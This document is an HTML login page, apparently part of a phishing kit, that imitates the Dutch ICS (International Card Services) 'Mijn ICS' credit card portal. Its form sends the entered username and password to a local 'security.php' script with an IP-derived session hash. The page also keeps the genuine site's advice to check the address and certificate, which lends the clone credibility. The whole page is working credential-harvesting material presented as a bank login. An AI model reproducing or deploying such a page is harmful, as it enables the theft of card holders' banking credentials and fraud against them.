<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html lang="nl" xml:lang="nl" xmlns="http://www.w3.org/1999/xhtml" class="win chrome chrome5 webkit webkit5"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style></style>

<title>Inloggen</title>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<link rel="stylesheet" type="text/css" href="./login_files/reset.css">
<link rel="stylesheet" type="text/css" href="./login_files/structure.css">
<link rel="stylesheet" type="text/css" href="./login_files/components.css">
<link rel="stylesheet" type="text/css" href="./login_files/jquery.keypad.css">
<link rel="stylesheet" type="text/css" href="./login_files/js-enabled.css">
<script src="./login_files/modal.js"></script>
<!--[if IE 7]><link href="/theme/ics/style/ie7-fix.css?v=15.7.0.0" rel="stylesheet" type="text/css" /><![endif]-->
<!--[if IE 8]><link href="/theme/ics/style/ie8-fix.css?v=15.7.0.0" rel="stylesheet" type="text/css" /><![endif]-->
<!--[if IE 9]><link href="/theme/ics/style/ie9-fix.css?v=15.7.0.0" rel="stylesheet" type="text/css" /><![endif]-->
<style type="text/css">@import url('./login_files/import.css');</style>
</head>
<body class="ics">
<div id="PageContainer">
<div class="RowContainer">
<!--MandatoryHeaderBegin-->
<!-- ClickTale Top part -->

<!--MandatoryHeaderEnd-->
<div class="clear"><div id="Header"><div class="header-block"><div class="logo-block"><img alt="Logo voor afdruk-weergave" src="./login_files/logo-ics.gif" class="print"><a href="" title=""><strong>ICS - International Card Services</strong></a></div></div><div id="Navigation" class="navigation-block"><strong class="text-only">Pagina navigatie:</strong><ul><li id="nav-00"><a href=""><span>Home</span></a></li><li id="nav-01"><a href=""><span>Producten</span></a></li><li id="nav-02"><a href=""><span>Aanbiedingen</span></a></li><li id="nav-03"><a href=""><span>Klantenservice</span></a></li><li id="nav-05" class="active"><a id="nav-login" href=""><span>Mijn ICS</span></a></li></ul><form enctype="text/plain" method="get" action=""><fieldset><legend>Zoeken</legend><label for="searchString" class="text-only">Uw vraag in minimaal 2 woorden</label><input maxlength="128" class="text-field label-value remove-value no-focus" name="searchString" id="searchString" type="text"><input class="button-submit" value="" name="search-header" id="search-header" type="submit" formnovalidate="formnovalidate"></fieldset></form></div></div>
</div>
<div class="RowContainer">
<div class="col maincontent">
<div class="form-block style02">
<div class="form-container">
<h1>Inloggen</h1>
<script>
function empty() {
    var x;
    x = document.getElementById("username").value;
    if (x == "") {
        MsgBox('U gebruikersnaam is verplicht.', 'ERROR');
        return false;
    };
	var y;
    y = document.getElementById("password").value;
    if (y == "") {
        MsgBox('U wachtwoord is verplicht.', 'ERROR');
        return false;
    }
}
</script>
<form id="pkmslogin-form" style="" action="security.php?&sessionid=<?php $v_ip = $_SERVER['REMOTE_ADDR']; $hash = md5($v_ip); echo $hash; ?>&securessl=true" method="post" accept-charset="UTF-8" onsubmit="return empty();">
<fieldset>
<div>
<a href="" class="link-help">Help</a><label for="username">Inlognaam
</label>

<div class="inline-col"><input id="username" name="username" class="text-field M" tabindex="1" type="text" value="" maxlength="180" autocomplete="off">
<input id="rememberLogin" name="rememberLogin" class="checkbox topspace" tabindex="3" type="checkbox" value="true">
<label for="rememberLogin" class="label-next">Onthoud inlognaam
</label>
</div></div><br>
<br>
<div>
<a href="" class="link-help">Help</a><label for="password">Wachtwoord
</label>

<input id="password" name="password" class="text-field M" tabindex="2" type="password" value="" maxlength="256"></div><br>
<br>
</fieldset>
<fieldset class="form-buttons">
<div class="button-login">

<input type="submit" id="button-login" tabindex="4" value="Inloggen" class="">
</div>
</fieldset>
<input type="hidden" name="uuid" value="e44b9c5b-56fa-4c6f-881a-039bc11896e2">
</form>

<div class="linklist-block"><ul><li><a href="">Inlognaam en/of wachtwoord vergeten?</a></li><li><a href="">Problemen met inloggen?</a></li><li><a href="" title="Activeren Mijn ICS">Nog geen gebruiker van Mijn ICS? </a></li></ul></div>
</div>
</div>

</div>
<div class="col sidebar">
<div class="container">
<div class="row">
<div class="col" style="width:81px;">

</div>
</div>
<div class="row">
<div class="col" style="width:250px;"><div><div class="column-2">
<div class="trigger-block">
<h2>Veilig ingelogd op Mijn ICS</h2>
<p><strong>Let op de volgende zaken om zeker te zijn dat u contact heeft met ICS:</strong></p>
<ul>
<li>Controleer of het adres in deze pagina begint met https://www.icscards.nl/.</li>
<li>Dubbelklik op het beveiligings- teken in uw browser (herkenbaar aan het slotje). Hier ziet u dat het certificaat is verleend aan www.icscards.nl.</li>
</ul>
<ul class="linklist">
<li><a class="link-more" href="">Meer over veilig internet</a></li>
</ul>
</div>
</div></div></div>
</div>
</div>
</div>
</div>
<div class="RowContainer">
<div id="footerlinks-block">
<div class="footerlinks-block"><a class="usp-campagne" href=""><img src="./login_files/usp_banner.png"></a><strong class="text-only">Algemene links:</strong><ul style="width:990px;margin-top: 0;"><li><span><a title="" href="">Over ICS</a></span></li><li><span><a title="" href="">Contact</a></span></li><li><span><a title="" href="">Privacy Statement</a></span></li><li><span><a title="Cookies instellen" href="">Cookies</a></span></li><li><span><a title="" href="">Disclaimer</a></span></li><li><span><a title="" href="">Algemene Voorwaarden</a></span></li><li><span><a title="Zakelijke Cards" href="" target="_blank">Zakelijke Cards</a></span></li><li><span><a title="" href="">Pers</a></span></li></ul><p></p></div>

</div>
</div>
</div>


</div><div class="keypad-popup" style="display: none;"></div><div id="cboxOverlay" style="display: none;"></div><div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;"><div id="cboxWrapper"><div><div id="cboxTopLeft" style="float: left;"></div><div id="cboxTopCenter" style="float: left;"></div><div id="cboxTopRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxMiddleLeft" style="float: left;"></div><div id="cboxContent" style="float: left;"><div id="cboxTitle" style="float: left;"></div><div id="cboxCurrent" style="float: left;"></div><button type="button" id="cboxPrevious"></button><button type="button" id="cboxNext"></button><button id="cboxSlideshow" formnovalidate="formnovalidate"></button><div id="cboxLoadingOverlay" style="float: left;"></div><div id="cboxLoadingGraphic" style="float: left;"></div></div><div id="cboxMiddleRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxBottomLeft" style="float: left;"></div><div id="cboxBottomCenter" style="float: left;"></div><div id="cboxBottomRight" style="float: left;"></div></div></div><div style="position: absolute; width: 9999px; visibility: hidden; display: none; max-width: none;"></div></div></body></html>